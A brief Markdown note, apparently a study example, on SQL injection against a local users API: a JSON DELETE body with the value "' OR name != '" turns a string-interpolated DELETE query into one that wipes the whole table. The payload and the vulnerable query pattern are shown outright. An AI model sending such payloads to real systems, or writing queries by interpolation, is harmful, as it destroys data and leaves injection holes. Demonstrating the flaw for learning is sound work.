# SQL Injection

## Scripts to broke the database

---

This request(delete) in http://localhost:3000/users will be delete all the users on the table

```json
{
    "name": "' OR name != '"
}
```

The query to delete, will stay:
```SQL
-- FROM
DELETE FROM "users" WHERE name = '${user.name}'

-- TO
DELETE FROM "users" WHERE name = '' OR name != ''
```